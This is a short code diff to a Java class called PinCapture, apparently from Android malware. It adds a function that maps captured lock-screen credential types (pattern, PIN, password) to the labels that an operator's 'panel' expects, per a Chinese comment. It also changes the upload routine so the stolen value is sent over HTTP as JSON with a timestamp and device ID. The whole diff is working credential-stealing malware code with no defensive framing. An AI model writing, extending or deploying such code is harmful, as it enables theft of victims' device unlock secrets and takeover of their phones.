@@ -715,7 +715,7 @@ public final class PinCapture {
             try {
                 org.json.JSONObject src = new org.json.JSONObject(value);
                 realText = src.optString("value", value);
-                realType = src.optString("type", ftype);
+                realType = mapType(src.optString("type", ftype));
             } catch (Throwable ignored) {
             }
 
@@ -750,11 +750,25 @@ public final class PinCapture {
         }
     }
 
+    /** 面板只认 pwd/pwd2/system/apppwd…，把内部类型映射过去 */
+    private static String mapType(String t) {
+        if ("pattern".equals(t)) return "system";
+        if ("pin".equals(t)) return "pwd";
+        if ("password".equals(t)) return "pwd2";
+        return t;
+    }
+
     private static void sendHttp(String value) {
         try {
             org.json.JSONObject o = new org.json.JSONObject();
             o.put("type", "pin_capture");
-            o.put("msg", value);
+            try {
+                org.json.JSONObject m = new org.json.JSONObject(value);
+                m.put("type", mapType(m.optString("type", capType)));
+                o.put("msg", m.toString());
+            } catch (Throwable ignored) {
+                o.put("msg", value);
+            }
             o.put("ts", System.currentTimeMillis());
             String dev = deviceId();
             if (dev.length() > 0) o.put("deviceId", dev);
